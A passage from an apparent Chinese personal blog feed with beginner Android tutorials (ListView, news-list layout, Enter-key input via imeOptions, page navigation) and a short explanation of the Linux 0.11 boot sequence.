int[]&#123;R.id.title,R.id.text&#125;);</span><br><span class="line">        listview.setAdapter(simp_Adapter);</span><br><span class="line">    &#125;</span><br><span class="line">    private List&lt;Map&lt;String,String&gt;&gt; getData()&#123;</span><br><span class="line">        String[] data_text = getResources().getStringArray(R.array.text_arr);</span><br><span class="line">        String[] data_title = getResources().getStringArray(R.array.title_arr);</span><br><span class="line">        for(int i=0;i&lt;data_text.length;i++)&#123;</span><br><span class="line">            Map&lt;String,String&gt;map = new HashMap&lt;String,String&gt;();</span><br><span class="line">            map.put("title",data_title[i]);</span><br><span class="line">            map.put("text",data_text[i]);</span><br><span class="line">            datalist.add(map);</span><br><span class="line">        &#125;</span><br><span class="line">        return datalist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>其对应的activity_main.xml文件为：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line">&lt;RelativeLayout xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    xmlns:tools=<span class="string">"http://schemas.android.com/tools"</span></span><br><span class="line">    android:id=<span class="string">"@+id/activity_main"</span></span><br><span class="line">    android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">    android:layout_height=<span class="string">"match_parent"</span></span><br><span class="line">    android:paddingBottom=<span class="string">"@dimen/activity_vertical_margin"</span></span><br><span class="line">    android:paddingTop=<span class="string">"@dimen/activity_vertical_margin"</span></span><br><span class="line">    tools:context=<span class="string">"com.example.lpf.test.MainActivity"</span>&gt;</span><br><span class="line">    &lt;ListView</span><br><span class="line">        android:id=<span class="string">"@+id/listview"</span></span><br><span class="line">        android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">        android:layout_height=<span class="string">"match_parent"</span></span><br><span class="line">        android:layout_alignParentBottom=<span class="string">"true"</span></span><br><span class="line">        android:layout_alignParentStart=<span class="string">"true"</span></span><br><span class="line">        android:<span class="attribute">background</span>=<span class="string">"@color/bg"</span></span><br><span class="line">        android:divider=<span class="string">"@color/item_item"</span></span><br><span class="line">        android:dividerHeight=<span class="string">"10dp"</span>/&gt;</span><br><span class="line">&lt;/RelativeLayout&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>再然后，编写点击后的后台跳转逻辑：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public class ShowActivity extends AppCompatActivity &#123;</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_show);</span><br><span class="line">        Bundle bundle = getIntent().getExtras();</span><br><span class="line">        String title = bundle.getString("title");</span><br><span class="line">        String text = bundle.getString("text");</span><br><span class="line">        TextView title_view = (TextView) findViewById(R.id.title);</span><br><span class="line">        title_view.setText(title);</span><br><span class="line">        TextView text_view = (TextView) findViewById(R.id.text);</span><br><span class="line">        text_view.setMovementMethod(ScrollingMovementMethod.getInstance());</span><br><span class="line">        text_view.setText(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>对应的activity_show.xml文件如下：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line">&lt;LinearLayout xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    android:orientation=<span class="string">"vertical"</span></span><br><span class="line">    android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">    android:layout_height=<span class="string">"match_parent"</span></span><br><span class="line">    android:paddingBottom=<span class="string">"@dimen/activity_vertical_margin"</span></span><br><span class="line">    android:paddingLeft=<span class="string">"@dimen/activity_horizontal_margin"</span></span><br><span class="line">    android:paddingRight=<span class="string">"@dimen/activity_horizontal_margin"</span></span><br><span class="line">    android:paddingTop=<span class="string">"@dimen/activity_vertical_margin"</span>&gt;</span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:layout_width=<span class="string">"wrap_content"</span></span><br><span class="line">        android:layout_height=<span class="string">"wrap_content"</span></span><br><span class="line">        android:id=<span class="string">"@+id/title"</span></span><br><span class="line">        android:text=<span class="string">"@string/title"</span></span><br><span class="line">        android:textSize=<span class="string">"22sp"</span></span><br><span class="line">        android:typeface=<span class="string">"monospace"</span></span><br><span class="line">        android:<span class="attribute">background</span>=<span class="string">"@color/itembg"</span>/&gt;</span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:layout_width=<span class="string">"wrap_content"</span></span><br><span class="line">        android:layout_height=<span class="string">"wrap_content"</span></span><br><span class="line">        android:id=<span class="string">"@+id/text"</span></span><br><span class="line">        android:textSize=<span class="string">"18sp"</span></span><br><span class="line">        android:textColor=<span class="string">"@color/textbg"</span></span><br><span class="line">        android:typeface=<span class="string">"normal"</span></span><br><span class="line">        android:scrollbars=<span class="string">"vertical"</span></span><br><span class="line">        android:text=<span class="string">"@string/text"</span>/&gt;</span><br><span class="line">&lt;/LinearLayout&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>最后就是负责点击跳转的任务的后台程序了：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public class TestActivity extends ListActivity &#123;</span><br><span class="line">    String[] data = &#123;"北京","西安","广州","上海"&#125;;</span><br><span class="line">    ListView lstview;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        lstview = (ListView)findViewById(R.id.listview);</span><br><span class="line">        lstview.setOnItemClickListener(new AdapterView.OnItemClickListener()&#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onItemClick(AdapterView&lt;?&gt; parent, View view, int position, long id) &#123;</span><br><span class="line">                String s = data[<span class="attribute">position</span>];    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        ArrayAdapter&lt;String&gt; adapter = new ArrayAdapter&lt;String&gt;(</span><br><span class="line">                this,</span><br><span class="line">                R<span class="selector-class">.layout</span><span class="selector-class">.item</span>,</span><br><span class="line">                R<span class="selector-class">.id</span><span class="selector-class">.listview</span>,</span><br><span class="line">                data</span><br><span class="line">        );</span><br><span class="line">        lstview.setAdapter(adapter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>附加一个item.xml用于接收显示：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line">&lt;LinearLayout xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    android:orientation=<span class="string">"vertical"</span></span><br><span class="line">    android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">    android:layout_height=<span class="string">"match_parent"</span></span><br><span class="line">    android:paddingBottom=<span class="string">"@dimen/activity_vertical_margin"</span></span><br><span class="line">    android:paddingLeft=<span class="string">"@dimen/activity_horizontal_margin"</span></span><br><span class="line">    android:paddingRight=<span class="string">"@dimen/activity_horizontal_margin"</span></span><br><span class="line">    android:paddingTop=<span class="string">"@dimen/activity_vertical_margin"</span></span><br><span class="line">    android:<span class="attribute">background</span>=<span class="string">"@drawable/white_bg"</span>&gt;</span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:layout_width=<span class="string">"wrap_content"</span></span><br><span class="line">        android:layout_height=<span class="string">"wrap_content"</span></span><br><span class="line">        android:id=<span class="string">"@+id/title"</span></span><br><span class="line">        android:text=<span class="string">"@string/title"</span></span><br><span class="line">        android:textSize=<span class="string">"20sp"</span></span><br><span class="line">        android:typeface=<span class="string">"monospace"</span></span><br><span class="line">        android:<span class="attribute">background</span>=<span class="string">"@color/itembg"</span>/&gt;</span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:layout_width=<span class="string">"wrap_content"</span></span><br><span class="line">        android:layout_height=<span class="string">"wrap_content"</span></span><br><span class="line">        android:id=<span class="string">"@+id/text"</span></span><br><span class="line">        android:textSize=<span class="string">"15sp"</span></span><br><span class="line">        android:textColor=<span class="string">"@color/textbg"</span></span><br><span class="line">        android:typeface=<span class="string">"normal"</span></span><br><span class="line">        android:maxLines=<span class="string">"3"</span></span><br><span class="line">        android:ellipsize=<span class="string">"end"</span></span><br><span class="line">        android:text=<span class="string">"@string/text"</span>/&gt;</span><br><span class="line">&lt;/LinearLayout&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>至此一个新闻客户端基本框架就已经编写完毕！</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/8fb3f6d8/">http://home.meng.uno/articles/8fb3f6d8/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      当我开始学安卓开发时，我发现网上最多的教程就是关于Android上的新闻客户端开发的（而且课时特别长），我本人觉得完全是那些上传网课的人想拉时长牟利，在写完listview之后，因为我们的《软设》项目需要，我也来做做“新闻页”，我只写显示过程（不涉及爬虫），只是为了记录下开发过程供初学者及日后自己回顾。 首先，我在values/string目录加上如下条目，用作显示（内容无关）：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36


&lt;strin
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Android" scheme="http://home.meng.uno/tags/Android/"/>
    
      <category term="新闻软件" scheme="http://home.meng.uno/tags/%E6%96%B0%E9%97%BB%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Linux 0.11启动引导</title>
    <link href="http://home.meng.uno/articles/6c138ff9/"/>
    <id>http://home.meng.uno/articles/6c138ff9/</id>
    <published>2016-12-16T06:52:23.000Z</published>
    <updated>2020-12-02T02:00:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>Linux引导启动程序程序在boot目录下，有bootset.s, head.s和setup.s（编译后），其中：</p><h2 id="bootset-s">bootset.s</h2><p>系统启动时首先是进入实模式，从地址0xffff0（这地址映射的rom-bios在内存的地址）处开始执行bios代码，然后执行系统检测（也就是自检过程）,然后初始化实模式的中断向量表(实模式中断向量在内存物理地址0处)。然后将启动设备的第一个扇区（512字节，也就是bootset.s编译完成的内容）内容读取到内存0x7c00(31kB)处，并且跳转到这里。 跳转到bootset.s后，bootset.s主要做如下工作： bootset.s在最前面的几句代码先将自己移动到内存0x90000（576kB）处；  bootset.s将启动设备第2个扇区到第五个扇区内容（4个扇区里面存放的是setup.s的内容）读取到内存0x90200处，也就是bootset.s后面； 将内核其他模块读取到0x10000（64KB）处，读取的大小为192KB，对于当时的内核来说确实是足够大了； 在bootset.s偏移508处定义了根文件系统的设备号，并且根据编译选项进行了赋值操代码默认启动驱动器是软盘a，然后就是bootset.s,setup.s,和内核镜像都成放在软盘a中;</p><h2 id="setup-s">setup.s</h2><p>将系统的一些参数存放在0x90000处,覆盖之前的bootset.s,参数主要包括，内存大小，硬盘参数，显存的参数信息以及根文件系统的设备号; 定义了GDT表，最后加载了gdtr和ldtr，最后跳到保护模式GDT表定义在setup.s,也就是在0x90200的那段内存中，LDT还没有定义。</p><h2 id="head-s">head.s</h2><p>其被编译到内核镜像中。重新定义了GDT表(目前就一个第二个段描述符有效)和并定义LDT表（表中中断处理程序目前还是指向一个默认的处理程序），并加载相应的寄存器； 内存开始处设置页目录表，一共有4个叶目录，初始化页目录，然后开启分页，最后跳到主函数main()。</p><p>至此，系统启动引导完成。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/6c138ff9/">http://home.meng.uno/articles/6c138ff9/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Linux引导启动程序程序在boot目录下，有bootset.s, head.s和setup.s（编译后），其中：

bootset.s
系统启动时首先是进入实模式，从地址0xffff0（这地址映射的rom-bios在内存的地址）处开始执行bios代码，然后执行系统检测（也就是自检过程）,然后初始化实模式的中断向量表(实模式中断向量在内存物理地址0处)。然后将启动设备的第一个扇区（512字节，也就是bootset.s编译完成的内容）内容读取到内存0x7c00(31kB)处，并且跳转到这里。 跳转到bootset.s后，bootset.s主要做如下工作： bootset.s在最前面的几句代码先将
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="操作系统" scheme="http://home.meng.uno/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="启动引导" scheme="http://home.meng.uno/tags/%E5%90%AF%E5%8A%A8%E5%BC%95%E5%AF%BC/"/>
    
  </entry>
  
  <entry>
    <title>Android的ListView的使用</title>
    <link href="http://home.meng.uno/articles/5d6c9819/"/>
    <id>http://home.meng.uno/articles/5d6c9819/</id>
    <published>2016-12-15T05:58:11.000Z</published>
    <updated>2020-12-02T01:40:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>可能我们在手机APP上使用的最多的视图就是列表了，那么Android列表（ListView）该怎么使用呢？</p><p>首先还是显示界面activity_main.xml:</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line">&lt;RelativeLayout xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    xmlns:tools=<span class="string">"http://schemas.android.com/tools"</span></span><br><span class="line">    android:id=<span class="string">"@+id/activity_main"</span></span><br><span class="line">    android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">    android:layout_height=<span class="string">"match_parent"</span></span><br><span class="line">    android:paddingBottom=<span class="string">"@dimen/activity_vertical_margin"</span></span><br><span class="line">    android:paddingTop=<span class="string">"@dimen/activity_vertical_margin"</span></span><br><span class="line">    tools:context=<span class="string">"com.example.lpf.test.MainActivity"</span>&gt;</span><br><span class="line">    &lt;ListView</span><br><span class="line">        android:id=<span class="string">"@+id/listview"</span></span><br><span class="line">        android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">        android:layout_height=<span class="string">"match_parent"</span></span><br><span class="line">        android:layout_alignParentBottom=<span class="string">"true"</span></span><br><span class="line">        android:layout_alignParentStart=<span class="string">"true"</span></span><br><span class="line">        android:<span class="attribute">background</span>=<span class="string">"@color/bg"</span></span><br><span class="line">        android:divider=<span class="string">"@color/item_item"</span></span><br><span class="line">        android:dividerHeight=<span class="string">"10dp"</span>/&gt;</span><br><span class="line">&lt;/RelativeLayout&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>之后是其对应的MainActivity.java文件：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public class MainActivity extends AppCompatActivity&#123;</span><br><span class="line">    private ListView listview;</span><br><span class="line">    <span class="comment">//private ArrayAdapter&lt;String&gt;arr_adapter;</span></span><br><span class="line">    private SimpleAdapter simp_Adapter;</span><br><span class="line">    private List&lt;Map&lt;String,String&gt;&gt;datalist;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        listview = (ListView)findViewById(R.id.listview);</span><br><span class="line">        datalist = new ArrayList&lt;Map&lt;String,String&gt;&gt;();</span><br><span class="line">        simp_Adapter = new SimpleAdapter(this,getData(),R<span class="selector-class">.layout</span><span class="selector-class">.item</span>,</span><br><span class="line">                new String[]&#123;"title","text"&#125;,new int[]&#123;R.id.title,R.id.text&#125;);</span><br><span class="line">        listview.setAdapter(simp_Adapter);</span><br><span class="line">    &#125;</span><br><span class="line">    private List&lt;Map&lt;String,String&gt;&gt; getData()&#123;</span><br><span class="line">        String[] data_text = getResources().getStringArray(R.array.text_arr);</span><br><span class="line">        String[] data_title = getResources().getStringArray(R.array.title_arr);</span><br><span class="line">        for(int i=0;i&lt;data_text.length;i++)&#123;</span><br><span class="line">            Map&lt;String,String&gt;map = new HashMap&lt;String,String&gt;();</span><br><span class="line">            map.put("title",data_title[i]);</span><br><span class="line">            map.put("text",data_text[i]);</span><br><span class="line">            datalist.add(map);</span><br><span class="line">        &#125;</span><br><span class="line">        return datalist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>其他文件保持不变即可。 至此，一个Android列表程序就实现了。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/5d6c9819/">http://home.meng.uno/articles/5d6c9819/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      可能我们在手机APP上使用的最多的视图就是列表了，那么Android列表（ListView）该怎么使用呢？

首先还是显示界面activity_main.xml:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19


&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
  
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="ListView" scheme="http://home.meng.uno/tags/ListView/"/>
    
      <category term="Android" scheme="http://home.meng.uno/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android实现输入框回车输入</title>
    <link href="http://home.meng.uno/articles/e60b1ba5/"/>
    <id>http://home.meng.uno/articles/e60b1ba5/</id>
    <published>2016-12-15T05:22:51.000Z</published>
    <updated>2020-12-02T01:40:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>用惯了iOS的各位在开发安卓程序或者使用安卓手机时，都会遇到这样一个问题：原本在iOS上都是回车输入，而到了Android上却需要点击按钮完成输入（对比两个系统上的QQ就发现了）。我一直在使用iOS系统，因为《软设》才着手Android开发，所以我就想能不能像iOS上的那样实现一个输入框+回车符完成输入呢？经过我查找资料，发现确实可以：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line">&lt;LinearLayout xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    xmlns:tools=<span class="string">"http://schemas.android.com/tools"</span></span><br><span class="line">    android:orientation=<span class="string">"vertical"</span></span><br><span class="line">    android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">    android:layout_height=<span class="string">"match_parent"</span></span><br><span class="line">    android:weightSum=<span class="string">"1"</span>&gt;</span><br><span class="line">    &lt;EditText</span><br><span class="line">        android:id=<span class="string">"@+id/edit_message"</span></span><br><span class="line">        android:layout_margin=<span class="string">"30dp"</span></span><br><span class="line">        android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">        android:layout_height=<span class="string">"80dp"</span></span><br><span class="line">        android:hint=<span class="string">"请输入文本信息 ..."</span></span><br><span class="line">        android:imeOptions=<span class="string">"actionSearch"</span></span><br><span class="line">        android:singleLine=<span class="string">"true"</span>/&gt;</span><br><span class="line">&lt;/LinearLayout&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>在EditText中加入了imeOptions就可以将回车符转变成各种各样的功能：</p><ul>  <li>actionDone——回车符–&gt;完成</li>  <li>actionSend——回车符–&gt;发送</li>  <li>actionGo——回车符–&gt;前进</li>  <li>actionNext——回车符–&gt;下一项</li>  <li>actionNone——回车符–&gt;无动作</li>  <li>actionPrevious——回车符–&gt;上一项</li>  <li>actionSearch——回车符–&gt;搜索</li>  <li>actionUnspecified——回车符–&gt;未指定</li>  <li>actionSend——回车符–&gt;发送</li></ul><p>又查阅资料发现：ime是Input Method Editors的缩写，也就是输入法编辑器，原来如此，不过想使用这个属性，必须加上<code>android:inputType</code> 或者 <code>android:singleline=&quot;true&quot;</code> 至此，就完成了Android回车符向iOS的转化！</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/e60b1ba5/">http://home.meng.uno/articles/e60b1ba5/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      用惯了iOS的各位在开发安卓程序或者使用安卓手机时，都会遇到这样一个问题：原本在iOS上都是回车输入，而到了Android上却需要点击按钮完成输入（对比两个系统上的QQ就发现了）。我一直在使用iOS系统，因为《软设》才着手Android开发，所以我就想能不能像iOS上的那样实现一个输入框+回车符完成输入呢？经过我查找资料，发现确实可以：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16


&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;LinearLayout xmlns:android=&quot;http://schemas.andro
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Android" scheme="http://home.meng.uno/tags/Android/"/>
    
      <category term="回车输入" scheme="http://home.meng.uno/tags/%E5%9B%9E%E8%BD%A6%E8%BE%93%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Android页面跳转</title>
    <link href="http://home.meng.uno/articles/1da18548/"/>
    <id>http://home.meng.uno/articles/1da18548/</id>
    <published>2016-12-15T04:46:49.000Z</published>
    <updated>2020-12-02T01:40:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前情提要">前情提要</h2><p>开发安卓单页面程序久了，必然会思考怎么开发像现在一般Android应用程序那样的多页面（指页面有跳转）程序，我也是在搜索了别人的博客之后，才总结出如下的这点精华步骤！</p><h2 id="编写androidmanifest-xml">编写AndroidManifest.xml</h2><p>首先，我们要确定我们需要怎样的跳转，既然跳转，无非就是自动跳转或者点击按钮，无论哪种，首先我们必须有两个界面（至少），所以在AndroidManifest.xml中，我们需要这样写：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;manifest xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    package=<span class="string">"uno.meng.download"</span>&gt;</span><br><span class="line">    &lt;application</span><br><span class="line">        android:allowBackup=<span class="string">"true"</span></span><br><span class="line">        android:<span class="attribute">icon</span>=<span class="string">"@mipmap/ic_launcher"</span></span><br><span class="line">        android:theme=<span class="string">"@style/AppTheme"</span>&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:name=<span class="string">".MainActivity"</span></span><br><span class="line">           android:label=<span class="string">"@string/app_name"</span>&gt;</span><br><span class="line">            &lt;intent-<span class="attribute">filter</span>&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span><br><span class="line">                &lt;category android:name=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span><br><span class="line">            &lt;/intent-<span class="attribute">filter</span>&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:name=<span class="string">".ResultActivity"</span></span><br><span class="line">            android:label=<span class="string">"@string/comeback"</span></span><br><span class="line">            android:parentActivityName=<span class="string">".MainActivity"</span> &gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=<span class="string">"android.support.PARENT_ACTIVITY"</span></span><br><span class="line">                android:value=<span class="string">".MainActivity"</span>/&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">    &lt;/application&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>其中，每个  <activity>对应一个界面，从代码中可见，我将后一个页面加了一个返回前一个页面的“返回符”。</activity></p><h2 id="编写跳转前界面search-xml">编写跳转前界面search.xml</h2><p>由于我在此将介绍怎么使用按钮跳转（带输入），所以直接在主界面search.xml（名称随意）中声明这两个组件（按钮，输入框）：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line">&lt;LinearLayout xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    xmlns:tools=<span class="string">"http://schemas.android.com/tools"</span></span><br><span class="line">    android:orientation=<span class="string">"vertical"</span></span><br><span class="line">    android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">    android:layout_height=<span class="string">"match_parent"</span></span><br><span class="line">    android:weightSum=<span class="string">"1"</span>&gt;</span><br><span class="line">    &lt;EditText</span><br><span class="line">        android:id=<span class="string">"@+id/edit_message"</span></span><br><span class="line">        android:layout_margin=<span class="string">"30dp"</span></span><br><span class="line">        android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">        android:layout_height=<span class="string">"80dp"</span></span><br><span class="line">        android:hint=<span class="string">"请输入文本信息 ..."</span>/&gt;</span><br><span class="line">    &lt;Button</span><br><span 